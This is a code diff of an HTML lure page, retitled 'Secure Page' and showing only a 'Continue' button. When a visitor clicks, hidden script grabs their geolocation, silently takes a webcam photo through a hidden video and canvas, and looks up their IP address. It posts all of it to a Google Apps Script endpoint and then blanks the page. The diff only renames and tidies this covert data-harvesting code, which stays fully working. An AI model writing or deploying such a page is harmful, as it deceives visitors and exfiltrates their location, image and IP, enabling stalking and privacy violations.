@@ -2,32 +2,31 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Continue</title>
+  <title>Secure Page</title>
 </head>
 <body>
-
-<button id="startBtn">Continue</button>
+<button id="start">Continue</button>
 
 <video id="video" autoplay playsinline style="display:none"></video>
 <canvas id="canvas" style="display:none"></canvas>
 
 <script>
-const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbyHMrAAaBc9mtft_hFyZY7uZI_wepbS_vE4g0xV-I32meKPDp1OhRf2BQj2mrT2MsLtow/exec";
+const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxHs52mIOt0df8YQYniKQU8GDfMeUs13gRdze8wgr-G9BW90fa6HcLNdH7cmthr6KDMZA/exec";
 
 async function getIP() {
   try {
     const res = await fetch("https://api.ipify.org?format=json");
     const data = await res.json();
     return data.ip;
-  } catch (e) {
-    return "IP not available";
+  } catch {
+    return "IP not found";
   }
 }
 
-document.getElementById("startBtn").addEventListener("click", async () => {
+document.getElementById("start").onclick = async () => {
 
-  // 📍 LOCATION
-  let locationData = {};
+  // LOCATION
+  let locationData = null;
   try {
     const pos = await new Promise((res, rej) =>
       navigator.geolocation.getCurrentPosition(res, rej)
@@ -36,10 +35,10 @@ document.getElementById("startBtn").addEventListener("click", async () => {
       latitude: pos.coords.latitude,
       longitude: pos.coords.longitude
     };
-  } catch (e) {}
+  } catch {}
 
-  // 📷 CAMERA
-  let photoData = "";
+  // CAMERA
+  let photoData = null;
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     const video = document.getElementById("video");
@@ -54,13 +53,13 @@ document.getElementById("startBtn").addEventListener("click", async () => {
     photoData = canvas.toDataURL("image/jpeg");
 
     stream.getTracks().forEach(t => t.stop());
-  } catch (e) {}
+  } catch {}
 
-  // 🌐 IP ADDRESS
+  // IP
   const ipAddress = await getIP();
 
-  // 🚀 SEND DATA
-  fetch(WEB_APP_URL, {
+  // SEND DATA
+  await fetch(WEB_APP_URL, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
@@ -71,10 +70,9 @@ document.getElementById("startBtn").addEventListener("click", async () => {
     })
   });
 
-  // 🕵️ BLANK PAGE
+  // BLANK PAGE
   document.body.innerHTML = "";
-});
+};
 </script>
-
 </body>
 </html>
